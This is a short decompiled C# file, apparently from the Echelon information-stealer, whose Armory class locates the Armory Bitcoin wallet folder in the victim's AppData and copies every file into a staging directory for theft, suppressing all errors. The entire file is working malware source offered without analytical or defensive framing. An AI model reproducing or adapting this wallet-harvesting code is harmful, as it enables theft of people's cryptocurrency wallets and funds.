using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000004 RID: 4
	internal class Armory
	{
		// Token: 0x06000007 RID: 7 RVA: 0x00002EFC File Offset: 0x000010FC
		public static void ArmoryStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + "\\Armory\\"))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Armory\\");
						fileInfo.CopyTo(directorypath + "\\Wallets\\Armory\\" + fileInfo.Name);
					}
					Armory.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400000D RID: 13
		public static int count;
	}
}
